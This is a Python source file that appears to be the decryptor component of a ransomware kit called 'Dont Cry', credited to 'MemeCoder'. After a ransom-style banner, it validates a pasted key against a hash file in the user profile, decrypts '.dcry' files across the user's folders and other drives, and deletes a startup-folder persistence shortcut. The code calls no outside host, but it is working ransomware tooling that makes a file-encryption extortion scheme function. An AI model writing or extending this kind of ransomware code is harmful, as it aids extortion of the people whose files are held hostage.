import os
import sys
import base64
import ctypes
import string
import hashlib
from concurrent.futures import ThreadPoolExecutor

import winshell
from Crypto.Cipher import AES
from colorama import Fore, init
from file_crypto import decrypt_file

init(autoreset=True)

baner = rf""" {Fore.LIGHTRED_EX} _______                     __   __             ______                      
 |       \                   |  \ |  \           /      \                     
 | $$$$$$$\  ______   _______| $$_| $$_         |  $$$$$$\  ______   __    __ 
 | $$  | $$ /      \ |       \\$|   $$ \        | $$   \$$ /      \ |  \  |  \
 | $$  | $$|  $$$$$$\| $$$$$$$\  \$$$$$$        | $$      |  $$$$$$\| $$  | $$
 | $$  | $$| $$  | $$| $$  | $$   | $$ __       | $$   __ | $$   \$$| $$  | $$
 | $$__/ $$| $$__/ $$| $$  | $$   | $$|  \      | $$__/  \| $$      | $$__/ $$
 | $$    $$ \$$    $$| $$  | $$    \$$  $$       \$$    $$| $$       \$$    $$
  \$$$$$$$   \$$$$$$  \$$   \$$     \$$$$         \$$$$$$  \$$       _\$$$$$$$
                                                                    |  \__| $$
                                                                     \$$    $$
                                                                      \$$$$$$
 
                             Decryptor by MemeCoder                            """

try:
    print("\033[2J\033[H", end="")
    print(baner)
    print()
    key_input = input("Enter a key: ").strip()
    decoded = base64.urlsafe_b64decode(key_input)
    magic, key = decoded[:10], decoded[10:]
except KeyboardInterrupt:
    exit(1)


def is_valid_key(key):
    try:
        key_file = os.path.join(os.environ["USERPROFILE"], "key")
        if magic != b"DCRY+DKEY$":
            return False
        if not key or len(key) != 16 or not os.path.exists(key_file):
            return False
        with open(key_file, "r") as f:
            return f.read() == hashlib.sha256(key).hexdigest()
    except:
        return False


def start_decryption():
    if not is_valid_key(key):
        print(f"\n{Fore.LIGHTRED_EX}Invalid key")
        input("Press enter to exit...")
        sys.exit(2)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Desktop"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Downloads"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Documents"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Pictures"), key)
    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Videos"), key)
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for disk in [
        f"{letter}:/"
        for i, letter in enumerate(string.ascii_uppercase)
        if bitmask & (1 << i)
    ]:
        if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
            decrypt_directory(disk, key)


def decrypt_directory(directory_path, key):
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = []
        for root, _, files in os.walk(directory_path):
            for file in files:
                if os.path.splitext(file)[1] != ".dcry":
                    continue
                file_path = os.path.join(root, file)
                futures.append(executor.submit(decrypt_file, file_path, key))
        for future in futures:
            future.result()


def main():
    start_decryption()
    startup = winshell.startup()
    shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
    if os.path.exists(shortcut_path):
        try:
            os.remove(shortcut_path)
        except:
            pass
    key_path = os.path.join(os.environ["USERPROFILE"], "key")
    if os.path.exists(key_path):
        try:
            os.remove(key_path)
        except:
            pass


if __name__ == "__main__":
    main()
